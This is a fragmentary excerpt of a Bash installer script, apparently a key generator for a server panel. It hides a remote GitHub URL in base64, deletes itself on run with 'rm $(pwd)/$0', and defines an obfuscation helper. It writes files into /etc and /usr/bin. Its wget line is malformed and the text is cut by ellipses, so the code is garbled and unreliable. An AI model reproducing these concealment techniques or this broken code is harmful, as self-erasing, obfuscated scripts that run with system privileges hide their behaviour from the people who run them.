...
SCPT_DIR="/etc/SCRIPT"
SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FMQU4tVEVDSy9HRU4vbWFpbi9LRVlT"
SUB_DOM='base64 -d'
rm $(pwd)/$0
ofus () {
unset txtofus
...
[[ ! -e /usr/bin/trans ]] && wget -O /usr/bin/trans apt-get 
 &> /dev/null
...
echo -ne "\033[0m"
echo "qra-atsilK8565?e4e?a98%08K8888:87@+@5@+@4?+?9@" > /etc/key-gerador
